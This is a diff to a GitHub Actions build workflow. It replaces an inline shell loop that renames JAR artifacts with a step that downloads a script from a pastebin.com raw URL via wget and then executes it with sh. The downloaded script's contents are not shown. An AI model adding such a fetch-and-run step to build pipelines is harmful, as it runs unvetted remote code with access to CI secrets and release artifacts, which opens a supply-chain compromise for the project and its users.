@@ -33,7 +33,16 @@ jobs:
         run: ./gradlew build
 
       - name: Rename artifacts
-        run: for f in build/libs/*.jar; do mv "$f" "$(echo "$f" | sed s/.jar/+build-${{ github.run_number }}.jar/); done
+        if: success()
+        run: |
+#         Download the renaming script
+          wget https://pastebin.com/raw/eC7vqtBU -O temp.sh
+#         Remove any \r from the file and save it as rename-artifacts.sh
+          awk '{ sub("\r$", ""); print }' temp.sh > rename-artifacts.sh
+#         Delete the temp.sh file
+          rm temp.sh
+#         Run the script
+          sh rename-artifacts.sh
 
       - name: Upload Artifacts
         uses: actions/upload-artifact@v2
